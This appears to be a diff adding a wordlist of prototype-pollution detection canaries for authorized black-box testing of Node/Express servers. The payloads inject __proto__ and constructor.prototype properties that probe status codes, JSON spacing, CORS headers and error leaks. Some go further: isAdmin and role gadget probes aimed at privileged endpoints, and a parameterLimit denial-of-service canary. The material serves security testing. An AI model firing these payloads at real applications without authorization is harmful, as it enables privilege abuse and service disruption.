@@ -1,0 +1,53 @@
+# Prototype pollution — detection canaries (PortSwigger black-box SSPP + Intruder)
+# Look for: status change, JSON spacing, CORS header, reflected param, crash/500
+# Authorized testing only.
+
+# Unique canary property names (grep response for CANARY_*)
+{"__proto__":{"CANARY_PP_7f3a":true}}
+{"__proto__":{"CANARY_STATUS":510}}
+{"__proto__":{"CANARY_JSON_SPACES":"  "}}
+{"__proto__":{"CANARY_EXPOSE":["X-Canary-Header"]}}
+?__proto__[CANARY_REFLECT]=CANARY_REFLECT_VALUE
+{"constructor":{"prototype":{"CANARY_CONSTRUCTOR":"yes"}}}
+
+# Express parameterLimit — send ?a=1&b=2 after pollution, expect different behavior
+{"__proto__":{"parameterLimit":1}}
+
+# ignoreQueryPrefix — GET ??CANARY=1
+{"__proto__":{"ignoreQueryPrefix":true}}
+
+# allowDots — GET ?CANARY.dot=1
+{"__proto__":{"allowDots":true}}
+
+# Status code oracle
+{"__proto__":{"status":510}}
+{"__proto__":{"statusCode":510}}
+{"__proto__":{"status":418}}
+
+# JSON formatting oracle
+{"__proto__":{"json spaces":"    "}}
+{"constructor":{"prototype":{"json spaces":20}}}
+
+# CORS oracle
+{"__proto__":{"exposedHeaders":["CANARY-CORS-TEST"]}}
+{"__proto__":{"exposedHeaders":["Access-Control-Allow-Origin"]}}
+
+# Content-Type / charset oracle
+{"__proto__":{"charset":"CANARY-CHARSET"}}
+{"__proto__":{"type":"text/html"}}
+
+# Error message oracle (polluted property in stack)
+{"__proto__":{"pollutedPropertyName":"CANARY_ERROR_LEAK"}}
+
+# Client-side canary (check Object.prototype in DevTools after navigation)
+?__proto__[CANARY_CLIENT]=1
+?constructor[prototype][CANARY_CLIENT]=1
+#__proto__[CANARY_HASH]=1
+
+# Boolean gadget probe (safe — no XSS)
+{"__proto__":{"isAdmin":false}}
+{"__proto__":{"role":"user"}}
+then verify if privileged endpoints accept low-priv user after merge
+
+# Timing / DoS canary (only if in scope)
+{"__proto__":{"parameterLimit":0}}
